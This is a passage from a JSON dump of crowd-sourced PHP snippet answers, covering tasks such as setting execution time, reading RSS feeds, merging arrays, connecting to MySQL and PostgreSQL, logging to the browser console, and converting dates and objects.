    "description": "ini_set('max_execution_time', '300'); //300 seconds = 5 minutes ini_set('max_execution_time', '0'); // for infinite time of execution \nBy default, the maximum execution time for PHP scripts is set to 30 seconds. If a script takes more than 30 seconds, PHP stops the script and returns an error. You can change the script run time by changing the max_execution_time directive in the php.ini file. When a script is called, set_time_limit function restarts the timeout counter from zero. It means, if default timer is set to 30 sec,  and 20 sec is specified in function set_time_limit(), then script will run for 45 seconds. If 0sec is specified in this function, script takes unlimited time.  Set Max_Execution_Time globally in php. ini 1. Locate and open your PHP build folder. 2. Find the php.ini file and open it. 3. Find the following line in the text configuration file &ndash; max_execution_time=30. 4. Change the value 30 to the value of choice, Remember, this value is in seconds. 5. Save & Close.    /* I hope it will help you. Namaste Stay Home Stay Safe */\n",
    "reg_date": "2021-10-12T10:17:44.000Z"
  },
  {
    "id": 3294,
    "keyword": null,
    "link": null,
    "title": " php code to read rss feed",
    "description": "<?php $url = \"https://www.youtube.com/feeds/videos.xml?channel_id=UCbMi18KmKXRb79716KgnVOA\"; $xml = simplexml_load_file($url) or die(\"Error: Cannot create object\");  //echo \"number of entries: \" . count($xml->entry) . \"<br/>\"; $i = 0; while($i <= count($xml->entry)-1){     //<id>yt:video:7AQdAE_Yhck</id>     echo str_replace(\"yt:video:\", \"\", $xml->entry[$i]->id[0])  . \"<br/><br/>\";     //<title>Michigan Capitol Building Lansing Michigan</title>     echo str_replace(\"yt:video:\", \"\", $xml->entry[$i]->title[0])  . \"<br/><br/>\";     //<author>     //<name>Michigan Constitutional Crusader</name>     echo str_replace(\"yt:video:\", \"\", $xml->entry[$i]->author[0]->name[0])  . \"<br/><br/>\";     //$result = $xml->xpath('*//media:group/media:description');     //<yt:videoId>7AQdAE_Yhck</yt:videoId>     echo $xml->xpath('*//yt:videoId')[$i]  . \"<br/><br/>\";     //<media:starRating count=\"20\" average=\"4.60\" min=\"1\" max=\"5\"/>     echo $xml->xpath('*//media:starRating/@count')[$i] .\" \". $xml->xpath('*//media:starRating/@average')[$i]  . \"<br/><br/>\";     //<media:description></media:description>     echo $xml->xpath('*//media:description')[$i]  . \"<br/><br/>\";     $i++;    }  ?>\n<?php   function getFeed($feed_url) {           $content = file_get_contents($feed_url);     $x = new SimpleXmlElement($content);           echo \"<ul>\";           foreach($x->channel->item as $entry) {         echo \"<li><a href='$entry->link' title='$entry->title'>\" . $entry->title . \"</a></li>\";     }     echo \"</ul>\"; } ?> \n",
    "reg_date": "2021-10-12T10:17:44.000Z"
  },
  {
    "id": 3295,
    "keyword": null,
    "link": null,
    "title": " php color echo",
    "description": "echo '<span style=\"color:#AFA;text-align:center;\">Request has been sent. Please wait for my reply!</span>';\n",
    "reg_date": "2021-10-12T10:17:44.000Z"
  },
  {
    "id": 3296,
    "keyword": null,
    "link": null,
    "title": " php combine arrays",
    "description": " <?php $array1 = array(\"color\" => \"red\", 2, 4); $array2 = array(\"a\", \"b\", \"color\" => \"green\", \"shape\" => \"trapezoid\", 4); $result = array_merge($array1, $array2); print_r($result); ?> Array (     [color] => green     [0] => 2     [1] => 4     [2] => a     [3] => b     [shape] => trapezoid     [4] => 4 ) \n<?php   $array1 = [       \"color\" => \"green\"   ];   $array2 = [       \"color\" => \"red\",        \"color\" => \"blue\"   ];   $result = array_merge($array1, $array2); ?>  // $result [     \"color\" => \"green\"     \"color\" => \"red\",      \"color\" => \"blue\" ]\n$output = array_merge($array1, $array2);\n/* Array merge is basically use to merge the two array data. */    <?php $a1=array(\"red\",\"green\"); $a2=array(\"blue\",\"green\",\"yellow\"); print_r(array_merge($a1,$a2)); ?>    /* Output: Array ( [0] => red [1] => green [2] => blue [3] => green [4] => yellow ) */    <?php $a1=array(\"a\"=>\"red\",\"b\"=>\"green\"); $a2=array(\"c\"=>\"blue\",\"b\"=>\"yellow\"); print_r(array_merge($a1,$a2)); ?>  /* Output: Array ( [a] => red [b] => yellow [c] => blue ) */    /* In above example you can check the difference in output  it takes all values of both array in final output, but not in associative array you can check. because one value gets overwritten by same key reference in both array. */ \narray_merge ([ array $... ] ) : array\n$all_arrays = array_merge($array1, $array2, $array3, ...);\n",
    "reg_date": "2021-10-12T10:17:45.000Z"
  },
  {
    "id": 3297,
    "keyword": null,
    "link": null,
    "title": " php comment",
    "description": "/**  * Does something interesting  *  * @param Place   $where  Where something interesting takes place  * @param integer $repeat How many times something interesting should happen  *   * @throws Some_Exception_Class If something interesting cannot happen  * @author Monkey Coder <mcoder@facebook.com>  * @return Status  */  \n// This is a single-line comment  # This is also a single-line comment  /* This is a multiple-lines comment block that spans over multiple lines */\n <?php  /*     echo 'This is a test'; /* This comment will cause a problem */  */ ?>  \n<?php // Author : https://www.codedweb.org/ // This is a single-line comment # This is also a single-line comment in unix and linux    /* This is a Multi-lines comment block by this way you can add muliple lines on it.  lines */    // You can also use comments to leave out parts of a code line $var = 2 /* + 12 */ + 2; echo $var; ?>\n<?php // This is a single-line comment  # This is also a single-line comment    /* This is a multiple-lines comment block that spans over multiple lines */    // You can also use comments to leave out parts of a code line $x = 5 /* + 15 */ + 5; echo $x; ?>\n// I'm a single, line comment  #  I am another single line comments using # /*  And I am a   multiline comment */\n",
    "reg_date": "2021-10-12T10:17:45.000Z"
  },
  {
    "id": 3298,
    "keyword": null,
    "link": null,
    "title": " php comment supprimer un fichier",
    "description": "if(file_exists($file)) { \tunlink($file); } \n",
    "reg_date": "2021-10-12T10:17:45.000Z"
  },
  {
    "id": 3299,
    "keyword": null,
    "link": null,
    "title": " php compare string",
    "description": "<?php $var1 = \"Hello\"; $var2 = \"hello\"; if (strcmp($var1, $var2) !== 0) {     echo '$var1 is not equal to $var2 in a case sensitive string comparison'; } ?>\n//In php to compare two string we can use strcmp() function Syntax strcmp(string1,string2);  //If both string is same then it will return 0 <?php echo strcmp(\"Hello world!\",\"Hello world!\"); ?>\n",
    "reg_date": "2021-10-12T10:17:45.000Z"
  },
  {
    "id": 3300,
    "keyword": null,
    "link": null,
    "title": " php compare two dates",
    "description": "$today = date(\"Y-m-d\"); $expire = $row->expireDate; //from database  $today_time = strtotime($today); $expire_time = strtotime($expire);  if ($expire_time < $today_time) { /* do Something */ }\n<?php  $datetime1 = new DateTime('2009-10-11 12:12:00'); $datetime2 = new DateTime('2009-10-13 10:12:00');  if ($datetime1 > $datetime2) {     echo 'datetime1 greater than datetime2'; }  if ($datetime1 < $datetime2) {     echo 'datetime1 lesser than datetime2'; }  if ($datetime1 == $datetime2) {     echo 'datetime2 is equal than datetime1'; }\n$period = new DatePeriod(      new DateTime('2010-10-01'),      new DateInterval('P1D'),      new DateTime('2010-10-05') );  //Which should get you an array with DateTime objects.   //To iterate  foreach ($period as $key => $value) {     //$value->format('Y-m-d')        }\n$date1 = new DateTime(\"now\"); $date2 = new DateTime(\"tomorrow\");  var_dump($date1 == $date2); // false var_dump($date1 < $date2); // true var_dump($date1 > $date2); // false \n$date_now = date(\"Y-m-d h:i:s\"); $variable = new DateTime($date_now); $to_compare = \"2018-06-01 12:48:09\"; $variable1 = new DateTime($to_compare); $difference = date_diff($variable, $variable1)->format(\"Difference => %Y years, %m months, %d days, %h hours, and %i minutes\"); echo $difference;\nSelect if(Date('2020-10-01') > Date('2020-11-01'), '1', '2' ) as rslt_date\n",
    "reg_date": "2021-10-12T10:17:45.000Z"
  },
  {
    "id": 3301,
    "keyword": null,
    "link": null,
    "title": " php composer update",
    "description": "composer self-update \nphp composer.phar update\nphp7.3 -f /usr/local/bin/composer update\n To update composer command just find location of composer.phar and update as:  where composer \t#Retrieves you location of your composer.phar  cd path_to_composer.phar #Move to directory with composer.phar  php composer.phar self-update\t#Update your composer\ncomposer require name-of-package\n",
    "reg_date": "2021-10-12T10:17:45.000Z"
  },
  {
    "id": 3302,
    "keyword": null,
    "link": null,
    "title": " php concat",
    "description": "$string3 = $string1 . $string2;\n$a = \"hello\"; $b = \"world\"; $c = $a . \" \" . $b;  echo $c; // hello world\nphpCopy<?php $mystring1 = \"This is the first string. \"; $mystring2 = \"This is the second string. \"; $mystring3 = \"This is the third string. \"; $mystring4 = \"This is the fourth string. \"; $mystring5 = \"This is the fifth string.\";  $mystring1 .= $mystring2 .= $mystring3 .= $mystring4 .= $mystring5; echo($mystring1); ?> \nphpCopy<?php $mystring1 = \"This is the first string. \"; $mystring2 = \"This is the second string\"; $finalString = sprintf(\"%s %s\", $mystring1, $mystring2); echo($finalString); ?> \n<?php   // First String  $a = 'Hello';   // Second String  $b = 'World!';   // Concatenation Of String  $c = $a.$b;   // print Concatenate String  echo \" $c \\n\";  ?>  \nphpCopy<?php $mystring1 = \"This is the first string. \"; $mystring2 = \"This is the second string. \"; $mystring3 = \"This is the third string. \"; $mystring4 = \"This is the fourth string. \"; $mystring5 = \"This is the fifth string.\";  $finalString = $mystring1 . $mystring2 . $mystring3 . $mystring4 . $mystring5; echo($finalString); ?> \n",
    "reg_date": "2021-10-12T10:17:45.000Z"
  },
  {
    "id": 3303,
    "keyword": null,
    "link": null,
    "title": " php conditionally remove element from array",
    "description": "foreach ($array as $key => $element) {     if ($element['age'] > 90) {         unset($array[$key]);     } }\n",
    "reg_date": "2021-10-12T10:17:45.000Z"
  },
  {
    "id": 3304,
    "keyword": null,
    "link": null,
    "title": " php configuration",
    "description": "phpinfo();\n",
    "reg_date": "2021-10-12T10:17:45.000Z"
  },
  {
    "id": 3305,
    "keyword": null,
    "link": null,
    "title": " php confirm box",
    "description": "If you want to do this only in PHP, you will need to add \"steps\" in your script, like:  step1 (show form) -> step2 (ask validation) -> step3 (validate) To do so, you can use sessions to keep form content, and GET parameter to track the step. Otherwise the simplest solution is to use javascript:  echo \"<td><a onClick=\\\"javascript: return confirm('Please confirm deletion');\\\" href='delete.php?id=\".$query2['id'].\"'>x</a></td><tr>\"; //use double quotes for js inside php!\n",
    "reg_date": "2021-10-12T10:17:45.000Z"
  },
  {
    "id": 3306,
    "keyword": null,
    "link": null,
    "title": " php connect ms sql server",
    "description": "<?php $servername = \"localhost\"; $username = \"username\"; $password = \"password\"; $dbname = \"myDB\";  // Create connection $conn= mysqli_connect($servername,$username,$password,$dbname); // Check connection if (!$conn) {   die(\"Connection failed: \" . mysqli_connect_error()); } echo \"Connected Successfully.\"; ?>\n <?php $serverName = \"serverName\\\\sqlexpress\"; //serverName\\instanceName  // Since UID and PWD are not specified in the $connectionInfo array, // The connection will be attempted using Windows Authentication. $connectionInfo = array( \"Database\"=>\"dbName\"); $conn = sqlsrv_connect( $serverName, $connectionInfo);  if( $conn ) {      echo \"Connection established.<br />\"; }else{      echo \"Connection could not be established.<br />\";      die( print_r( sqlsrv_errors(), true)); } ?>  \n",
    "reg_date": "2021-10-12T10:17:46.000Z"
  },
  {
    "id": 3307,
    "keyword": null,
    "link": null,
    "title": " php connect strings",
    "description": "$string3 = $string1 . $string2;\n$string = \"the color is \"; $string .= \"red\";  echo $string; // gives: the color is red\n",
    "reg_date": "2021-10-12T10:17:46.000Z"
  },
  {
    "id": 3308,
    "keyword": null,
    "link": null,
    "title": " php connect to mysql",
    "description": "<?php $servername = \"localhost\"; $username = \"username\"; $password = \"password\"; $dbname = \"myDB\";  // Create connection $conn= mysqli_connect($servername,$username,$password,$dbname); // Check connection if (!$conn) {   die(\"Connection failed: \" . mysqli_connect_error()); } echo \"Connected Successfully.\"; ?>\n$servername = \"localhost\"; $username = \"username\"; $password = \"password\";  // Create connection $conn = new mysqli($servername, $username, $password);  // Check connection if ($conn->connect_error) {     die(\"Connection failed: \" . $conn->connect_error); } echo \"Connected successfully\";   Simplified  $conn = mysqli_connect('localhost', 'username', 'password'); $database = mysqli_select_db($conn, 'database');\n<?php     $user = \"username\";     $pass = \"password\";     $host = \"host\";     $dbdb = \"database\";      $conn = new mysqli($host, $user, $pass, $dbdb);    if ($conn->connect_error) {     die(\"Connection failed: \" . $conn->connect_error); }  ?>\n# MySql improved <?php     $mysqli = new mysqli(\"localhost\", \"username\", \"password\", \"dbname\"); \t$result = $mysqli->query(\"SELECT lastname FROM employees\"); ?> # Connection with PDO <?php     $myPDO = new PDO('mysql:host=localhost;dbname=dbname', 'username', 'password'); \t$result = $myPDO->query(\"SELECT lastname FROM employees\"); ?> # With PHP legacy functions: <?php     mysql_connect('localhost','username','password');     mysql_select_db(\"dbname\"); \t$result = mysql_query('SELECT lastname FROM employees'); ?>\nJust include this Temlate in other file using PHP Include/Require Keywords  And Make Connection In One Shot :)  <?php        // echo \"Welcome to Connecting of DB Tutorial!\";     // echo \"<br>\";      // 1. PDO - Php Data Objects     // 2. MySQLi extension      // Set Connection Variable     $server = \"localhost\";     $username = \"root\";     $password = \"\";     $database = \"test\";      // Create A Connection     $con = mysqLi_connect($server, $username, $password, $database);       // Check For Connection      if(!$con){         die (\"Connection Terminated! by Die() function\". mysqLi_connect_error());             }     else {         echo \"Connection Succefully Happened! <br>\";     }       ?>\n<?php $servername = \"localhost\"; $username = \"username\"; $password = \"password\";  // Create connection $conn = new mysqli($servername, $username, $password);  // Check connection if ($conn->connect_error) {     die(\"Connection failed: \" . $conn->connect_error); } echo \"Connected successfully\"; ?>\n",
    "reg_date": "2021-10-12T10:17:46.000Z"
  },
  {
    "id": 3309,
    "keyword": null,
    "link": null,
    "title": " php connect to postgresql",
    "description": "<?php     $db_connection = pg_connect(\"host=localhost dbname=dbname user=username password=password\"); \t$result = pg_query($db_connection, \"SELECT lastname FROM employees\"); ?> <?php  // with PDO     $myPDO = new PDO('pgsql:host=localhost;dbname=dbname', 'username', 'password'); \t$result = $myPDO->query(\"SELECT lastname FROM employees\"); ?>\n",
    "reg_date": "2021-10-12T10:17:46.000Z"
  },
  {
    "id": 3310,
    "keyword": null,
    "link": null,
    "title": " php console log",
    "description": "// Assuming you are wishing to log to the JS Console...  <?php \tfunction consoleLog($msg) { \t\techo '<script type=\"text/javascript\">' .           'console.log(' . $msg . ');</script>'; \t}  \tconsoleLog('Hello, console!'); ?>\n/* console.log in php */  <?php \tfunction consoleLog($message) { \t\techo '<script type=\"text/javascript\">' .           'console.log(' . $message . ');</script>'; \t}  \tconsoleLog('Hello, greppers!'); ?>\necho(\"<script type='text/javascript'> console.log($msg);</script>\");\n//display message in console  <?php \tfunction console_log($msg) { \t\techo '<script>' .           'console.log(\"'.$msg .' \")</script>'; \t}  \tconsole_log(\"Hi there!\"); ?>\n// A little correction / improvement to @Kaotik's answer: <?php \tfunction consoleLog($msg) \t{ \t\techo '<script type=\"text/javascript\">console.log('           . str_replace('<', '\\\\x3C', json_encode($msg))           . ');</script>'; \t}  \tconsoleLog('Hello, console!'); ?>\nfunction debug($var, $die = false, $trace = true, $show_from = true)     {         //Trick to avoid html corruptions         echo '</select>';         echo '</script>';                  // BackTrace         $stack = '';         $i = 1;         $trace = debug_backtrace();         array_shift($trace);          foreach ($trace as $node) {           if (isset($node['file']) && ($node['line'])) {             $stack .= \"#$i \" . $node['file'] . \"(\" . $node['line'] . \"): \";           }           if (isset($node['class'])) {             $stack .= $node['class'] . \"->\";           }           $stack .= $node['function'] . \"()\" . PHP_EOL;           $i++;         }          $out[] = '<pre style=\"background-color:#CCCCCC\">';         if ($show_from) {           $calledFrom = debug_backtrace();           $out[] = '<strong>' . substr(str_replace(dirname(__FILE__), '', $calledFrom[0]['file']), 1) . '</strong>';           $out[] = ' (line <strong>' . $calledFrom[0]['line'] . '</strong>)';         }         $out[] = htmlspecialchars(print_r($var, true));         if (is_object($var)) {           $out[] = '-------- Class methods --------';           $out[] = print_r(get_class_methods(get_class($var)), true);         }          if ($trace) {           $out[] = '-------- Backtrace --------';           $out[] = $stack;         }          $out[] = '</pre>';         echo implode(PHP_EOL, $out);         if ($die) {           die();         }         break;      }\n",
    "reg_date": "2021-10-12T10:17:46.000Z"
  },
  {
    "id": 3311,
    "keyword": null,
    "link": null,
    "title": " php console log array",
    "description": "echo \"<script>console.log(`\" . json_encode($data) . \"`);</script>\";\n",
    "reg_date": "2021-10-12T10:17:46.000Z"
  },
  {
    "id": 3312,
    "keyword": null,
    "link": null,
    "title": " php const",
    "description": "<?php     define('CONSTANT', 'Hello world !');     const CONSTANT = 'Hello world !';     const NEW_CONSTANT = CONSTANT.' And beyond...';     const ANIMALS = array('dog', 'cat', 'ant');     define('ANIMALS', array('dog', 'cat', 'ant')); ?>\n<?php  define(\"GREETING\", \"Constant value \"); echo GREETING; ?>  \n<?php define(\"PI\",3.14); echo PI; echo constant(\"PI\"); ?>\nclass Human {   const TYPE_MALE = 'm';   const TYPE_FEMALE = 'f';   const TYPE_UNKNOWN = 'u'; // When user didn't select his gender      ............. }\n",
    "reg_date": "2021-10-12T10:17:46.000Z"
  },
  {
    "id": 3313,
    "keyword": null,
    "link": null,
    "title": " php constant array",
    "description": "<?php define(\"vehicles\", [   \"car\",   \"bike\",   \"jcb\" ]); echo vehicles[0];\t\t//car ?>\n<?php     const ANIMALS = array('dog', 'cat', 'ant');     define('ANIMALS', array('dog', 'cat', 'ant')); ?>\n",
    "reg_date": "2021-10-12T10:17:46.000Z"
  },
  {
    "id": 3314,
    "keyword": null,
    "link": null,
    "title": " php constant name with variable",
    "description": "echo constant($constant_name);\n",
    "reg_date": "2021-10-12T10:17:47.000Z"
  },
  {
    "id": 3315,
    "keyword": null,
    "link": null,
    "title": " php contains substring",
    "description": "$myString = 'Hello Bob how are you?';  if (strpos($myString, 'Bob') !== false) {      echo \"My string contains Bob\";  }\n$string = 'The lazy fox jumped over the fence';  if (str_contains($string, 'lazy')) {     echo \"The string 'lazy' was found in the string\\n\"; }  \n$a = 'How are you?';  if (strpos($a, 'are') !== false) {     echo 'true'; }\n <?php $mystring = 'abc'; $findme   = 'a'; $pos = strpos($mystring, $findme);  // Note our use of ===.  Simply == would not work as expected // because the position of 'a' was the 0th (first) character. if ($pos === false) {     echo \"The string '$findme' was not found in the string '$mystring'\"; } else {     echo \"The string '$findme' was found in the string '$mystring'\";     echo \" and exists at position $pos\"; } ?>  \n<?php function g($string,$start,$end){      preg_match_all('/' . preg_quote($start, '/') . '(.*?)'. preg_quote($end, '/').'/i', $string, $m);      $out = array();       foreach($m[1] as $key => $value){        $type = explode('::',$value);        if(sizeof($type)>1){           if(!is_array($out[$type[0]]))              $out[$type[0]] = array();           $out[$type[0]][] = $type[1];        } else {           $out[] = $value;        }      }   return $out; } print_r(g('Sample text, [/text to extract/] Rest of sample text [/WEB::http://google.com/] bla bla bla. ','[/','/]')); ?>  results: Array (     [0] => text to extract     [WEB] => Array         (             [0] => http://google.com         )  )  Can be helpfull to custom parsing :)   \n",
    "reg_date": "2021-10-12T10:17:47.000Z"
  },
  {
    "id": 3316,
    "keyword": null,
    "link": null,
    "title": " php content type xml",
    "description": "header('Content-type: application/xml'); \n",
    "reg_date": "2021-10-12T10:17:47.000Z"
  },
  {
    "id": 3317,
    "keyword": null,
    "link": null,
    "title": " php contruct parent",
    "description": " <?php class BaseClass {     function __construct() {         print \"In BaseClass constructor\\n\";     } }  class SubClass extends BaseClass {     function __construct() {         parent::__construct();         print \"In SubClass constructor\\n\";     } }  class OtherSubClass extends BaseClass {     // inherits BaseClass's constructor }  // In BaseClass constructor $obj = new BaseClass();  // In BaseClass constructor // In SubClass constructor $obj = new SubClass();  // In BaseClass constructor $obj = new OtherSubClass(); ?>  \n",
    "reg_date": "2021-10-12T10:17:47.000Z"
  },
  {
    "id": 3318,
    "keyword": null,
    "link": null,
    "title": " php convert array to json object",
    "description": "$myArr = array(\"apple\", \"banana\", \"mango\", \"jackfruit\");  $toJSON = json_encode($myArr);  echo $toJSON;\n{} = json_encode([]);\n<?php   // Loop through Array   $someArray = ...; // Replace ... with your PHP Array   foreach ($someArray as $key => $value) {     echo $value[\"name\"] . \", \" . $value[\"gender\"] . \"<br>\";   }    // Loop through Object   $someObject = ...; // Replace ... with your PHP Object   foreach($someObject as $key => $value) {     echo $value->name . \", \" . $value->gender . \"<br>\";   } ?> \n",
    "reg_date": "2021-10-12T10:17:47.000Z"
  },
  {
    "id": 3319,
    "keyword": null,
    "link": null,
    "title": " php convert array to object",
    "description": "$object = (object) $array;\n$object = json_decode(json_encode($array), FALSE); \n$arrayResult = array_map(function($array){     return (object)$array; }, $yourOrinalArray);\n",
    "reg_date": "2021-10-12T10:17:47.000Z"
  },
  {
    "id": 3320,
    "keyword": null,
    "link": null,
    "title": " php convert bytes to mb",
    "description": "function toByteSize($p_sFormatted) {     $aUnits = array('B'=>0, 'KB'=>1, 'MB'=>2, 'GB'=>3, 'TB'=>4, 'PB'=>5, 'EB'=>6, 'ZB'=>7, 'YB'=>8);     $sUnit = strtoupper(trim(substr($p_sFormatted, -2)));     if (intval($sUnit) !== 0) {         $sUnit = 'B';     }     if (!in_array($sUnit, array_keys($aUnits))) {         return false;     }     $iUnits = trim(substr($p_sFormatted, 0, strlen($p_sFormatted) - 2));     if (!intval($iUnits) == $iUnits) {         return false;     }     return $iUnits * pow(1024, $aUnits[$sUnit]); }\n<?php    function tobytes($size, $type)   {     $types = array(\"B\", \"KB\", \"MB\", \"GB\", \"TB\", \"PB\"); //You can add the rest if needed..          if($key = array_search($type, $types))       return $size * pow(1024, $key);     else return \"invalid type\";   }      echo tobytes(15, \"MB\"); //15728640   echo tobytes(2, \"KB\"); //2048   echo tobytes(3, \"w/e\"); //invalid type  ?> \n<?php // Snippet from PHP Share: http://www.phpshare.org      function formatSizeUnits($bytes)     {         if ($bytes >= 1073741824)         {             $bytes = number_format($bytes / 1073741824, 2) . ' GB';         }         elseif ($bytes >= 1048576)         {             $bytes = number_format($bytes / 1048576, 2) . ' MB';         }         elseif ($bytes >= 1024)         {             $bytes = number_format($bytes / 1024, 2) . ' KB';         }         elseif ($bytes > 1)         {             $bytes = $bytes . ' bytes';         }         elseif ($bytes == 1)         {             $bytes = $bytes . ' byte';         }         else         {             $bytes = '0 bytes';         }          return $bytes; } ?> \nfunction formatBytes($bytes, $precision = 2) {      $units = array('B', 'KB', 'MB', 'GB', 'TB');       $bytes = max($bytes, 0);      $pow = floor(($bytes ? log($bytes) : 0) / log(1024));      $pow = min($pow, count($units) - 1);       // Uncomment one of the following alternatives     // $bytes /= pow(1024, $pow);     // $bytes /= (1 << (10 * $pow));       return round($bytes, $precision) . ' ' . $units[$pow];  } \n",
    "reg_date": "2021-10-12T10:17:47.000Z"
  },
  {
    "id": 3321,
    "keyword": null,
    "link": null,
    "title": " php convert char to hex",
    "description": "<?php  $str = bin2hex(\"Hello World\"); echo($str);  ?>  \n",
    "reg_date": "2021-10-12T10:17:47.000Z"
  },
  {
    "id": 3322,
    "keyword": null,
    "link": null,
    "title": " php convert date and time to iso 8601",
    "description": "//Object Oriented Method  $datetime = new DateTime('2010-12-30 23:21:46');  echo $datetime->format(DateTime::ATOM); // Updated ISO8601   //Procedural Method  echo date(DATE_ISO8601, strtotime('2010-12-30 23:21:46'));\n",
    "reg_date": "2021-10-12T10:17:47.000Z"
  },
  {
    "id": 3323,
    "keyword": null,
    "link": null,
    "title": " php convert date from dd/mm/yyyy to yyyy-mm-dd",
    "description": "date(\"d/m/Y\", strtotime($str));\n$date = DateTime::createFromFormat('d/m/Y', \"24/04/2012\"); echo $date->format('Y-m-d');\n",
    "reg_date": "2021-10-12T10:17:47.000Z"
  },
  {
    "id": 3324,
    "keyword": null,
    "link": null,
    "title": " php convert guzzle response to json",
    "description": "$response = GuzzleHttp\\get('http://httpbin.org/get'); if ($response->getBody()) {     echo $response->getBody();     // JSON string: { ... } } \n",
    "reg_date": "2021-10-12T10:17:47.000Z"
  },
  {
    "id": 3325,
    "keyword": null,
    "link": null,
    "title": " php convert link to embed youtube",
    "description": "function convertYoutube($string) {     return preg_replace(         \"/\\s*[a-zA-Z\\/\\/:\\.]*youtu(be.com\\/watch\\?v=|.be\\/)([a-zA-Z0-9\\-_]+)([a-zA-Z0-9\\/\\*\\-\\_\\?\\&\\;\\%\\=\\.]*)/i\",         \"<iframe src=\\\"//www.youtube.com/embed/$2\\\" allowfullscreen></iframe>\",         $string     ); }\npreg_replace(\"/\\s*[a-zA-Z\\/\\/:\\.]*youtube.com\\/watch\\?v=([a-zA-Z0-9\\-_]+)([a-zA-Z0-9\\/\\*\\-\\_\\?\\&\\;\\%\\=\\.]*)/i\",\"<iframe width=\\\"420\\\" height=\\\"315\\\" src=\\\"//www.youtube.com/embed/$1\\\" frameborder=\\\"0\\\" allowfullscreen></iframe>\",$post_details['description']);\n<iframe width=\"560\" height=\"315\" src=\"https://www.youtube.com/embed/APK8ivaGqFY\" title=\"YouTube video player\" frameborder=\"0\" allow=\"accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture\" allowfullscreen></iframe>\n",
    "reg_date": "2021-10-12T10:17:48.000Z"
  },
  {
    "id": 3326,
    "keyword": null,
    "link": null,
    "title": " php convert mb to bytes",
    "description": "function toByteSize($p_sFormatted) {     $aUnits = array('B'=>0, 'KB'=>1, 'MB'=>2, 'GB'=>3, 'TB'=>4, 'PB'=>5, 'EB'=>6, 'ZB'=>7, 'YB'=>8);     $sUnit = strtoupper(trim(substr($p_sFormatted, -2)));     if (intval($sUnit) !== 0) {         $sUnit = 'B';     }     if (!in_array($sUnit, array_keys($aUnits))) {         return false;     }     $iUnits = trim(substr($p_sFormatted, 0, strlen($p_sFormatted) - 2));     if (!intval($iUnits) == $iUnits) {         return false;     }     return $iUnits * pow(1024, $aUnits[$sUnit]); }\n",
    "reg_date": "2021-10-12T10:17:48.000Z"
  },
  {
    "id": 3327,
    "keyword": null,
    "link": null,
    "title": " php convert minutes to hours and minutes",
    "description": "$hours = floor($final_time_saving / 60); $minutes = $final_time_saving % 60; \n",
    "reg_date": "2021-10-12T10:17:48.000Z"
  },
  {
    "id": 3328,
    "keyword": null,
    "link": null,
    "title": " php convert month number to name",
    "description": "$monthNum  = 3; $monthName = date('F', mktime(0, 0, 0, $monthNum, 10)); // March\n$monthNum  = 3; $dateObj   = DateTime::createFromFormat('!m', $monthNum); $monthName = $dateObj->format('F'); // March\n",
    "reg_date": "2021-10-12T10:17:48.000Z"
  },
  {
    "id": 3329,
    "keyword": null,
    "link": null,
    "title": " php convert multidimensional object to array",
    "description": "$person = new stdClass(); $person->firstName = \"Taylor\"; $person->age = 32;  //Convert Single-Dimention Object to array $personArray = (array) $person;  //Convert Multi-Dimentional Object to Array $personArray = objectToArray($person); function objectToArray ($object) {     if(!is_object($object) && !is_array($object)){     \treturn $object;     }     return array_map('objectToArray', (array) $object); }\n$singleArray = [];  foreach ($parentArray as $childArray)  {      foreach ($childArray as $value)      {      $singleArray[] = $value;      }  } \n",
    "reg_date": "2021-10-12T10:17:48.000Z"
  },
  {
    "id": 3330,
    "keyword": null,
    "link": null,
    "title": " php convert number to month",
    "description": "$month = date(\"m\",strtotime($mydate));\n$monthNum  = 3; $monthName = date('F', mktime(0, 0, 0, $monthNum, 10)); // March\n$monthNum  = 3; $dateObj   = DateTime::createFromFormat('!m', $monthNum); $monthName = $dateObj->format('F'); // March\n",
    "reg_date": "2021-10-12T10:17:48.000Z"
  },
  {
    "id": 3331,
    "keyword": null,
    "link": null,
    "title": " php convert object to array",
    "description": "//This works best $array = json_decode(json_encode($object), true);\n//It is verry  easy : just cast object to array $array =  (array)$object;\n$array = (array) $yourObject;\n$person = new stdClass(); $person->firstName = \"Taylor\"; $person->age = 32;  //Convert Single-Dimention Object to array $personArray = (array) $person;  //Convert Multi-Dimentional Object to Array $personArray = objectToArray($person); function objectToArray ($object) {     if(!is_object($object) && !is_array($object)){     \treturn $object;     }     return array_map('objectToArray', (array) $object); }\n<?php  class sample {             /* Member variables */     var $var1;      var $var2;             function __construct( $par1, $par2 )       {          $this->var1 = $par1;          $this->var2 = $par2;      }  }     // Creating the object  $myObj = new sample(1000, \"second\");  echo \"Before conversion: \\n\";  var_dump($myObj);     // Converting object to associative array  $myArray = json_decode(json_encode($myObj), true);  echo \"After conversion: \\n\";  var_dump($myArray);  ?>     Output: Before conversion:  object(sample)#1 (2) {   [\"var1\"]=>   int(1000)   [\"var2\"]=>   string(6) \"second\" }  After conversion:  array(2) {   [\"var1\"]=>   int(1000)   [\"var2\"]=>   string(6) \"second\" }\narray_values(get_object_vars($object));\n",
    "reg_date": "2021-10-12T10:17:48.000Z"
  },
  {
    "id": 3332,
    "keyword": null,
    "link": null,
    "title": " php convert spaces to underscores",
    "description": "$str = str_replace(' ', '_', $str); \n$str = str_replace(' ', '_', $str);\n",
    "reg_date": "2021-10-12T10:17:48.000Z"
  },
  {
    "id": 3333,
    "keyword": null,
    "link": null,
    "title": " php convert special characters to unicode",
    "description": "<?php /* Convert internal character encoding to SJIS */ $str = mb_convert_encoding($str, \"SJIS\");  /* Convert EUC-JP to UTF-7 */ $str = mb_convert_encoding($str, \"UTF-7\", \"EUC-JP\");  /* Auto detect encoding from JIS, eucjp-win, sjis-win, then convert str to UCS-2LE */ $str = mb_convert_encoding($str, \"UCS-2LE\", \"JIS, eucjp-win, sjis-win\");  /* \"auto\" is expanded to \"ASCII,JIS,UTF-8,EUC-JP,SJIS\" */ $str = mb_convert_encoding($str, \"EUC-JP\", \"auto\"); ?>\n",
    "reg_date": "2021-10-12T10:17:48.000Z"
  },
  {
    "id": 3334,
    "keyword": null,
    "link": null,
    "title": " php convert string to boolean",
